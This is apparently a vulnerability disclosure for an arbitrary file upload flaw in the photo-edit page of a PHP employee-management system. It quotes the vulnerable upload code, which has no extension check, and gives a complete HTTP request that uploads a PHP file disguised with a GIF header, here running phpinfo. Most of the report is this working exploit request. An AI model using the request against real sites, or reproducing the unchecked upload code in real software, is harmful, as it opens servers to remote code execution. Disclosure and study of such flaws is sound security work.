### Vulnerability file address

In line 12 of `Employee/edit-photo.php`, `$image= addslashes(file_get_contents($_FILES['userImage']['tmp_name']));`, the file extension is not whitelisted. Following up to line 15, `move_uploaded_file($_FILES["userImage"]["tmp_name"],"../uploadImage/Profile/" . $_FILES["userImage"]["name"]);`, the file is uploaded to the `uploadImage/Profile/` directory.

```php
<?php
include('../inc/topbar.php'); 
if(empty($_SESSION['login_email']))
    {   
      header("Location: ../Account/login.php"); 
    }

if(isset($_POST["btnedit"]))
{


$image= addslashes(file_get_contents($_FILES['userImage']['tmp_name']));
$image_name= addslashes($_FILES['userImage']['name']);
$image_size= getimagesize($_FILES['userImage']['tmp_name']);
move_uploaded_file($_FILES["userImage"]["tmp_name"],"../uploadImage/Profile/" . $_FILES["userImage"]["name"]);			
$location="uploadImage/Profile/" . $_FILES["userImage"]["name"];
```

### POC

```html
POST /CMS/php/employee_akpoly/Employee/edit-photo.php HTTP/1.1
Host: 10.0.0.20:82
Content-Type: multipart/form-data; boundary=---------------------------55395399231236061983284304644
Content-Length: 360
Origin: http://10.0.0.20:82
Connection: close
Cookie: PHPSESSID=81293i00fqra5g881e77or40t2
Upgrade-Insecure-Requests: 1

-----------------------------55395399231236061983284304644
Content-Disposition: form-data; name="userImage"; filename="6666.php"
Content-Type: image/png

GIF89a<?php phpinfo(); ?>

-----------------------------55395399231236061983284304644
Content-Disposition: form-data; name="btnedit"


-----------------------------55395399231236061983284304644--

```

### Attack results pictures

![image-20250128230607381](https://raw.githubusercontent.com/nixuchuan/imgs/main/202501282306416.png)

![image-20250128233829901](https://raw.githubusercontent.com/nixuchuan/imgs/main/202501282338937.png)





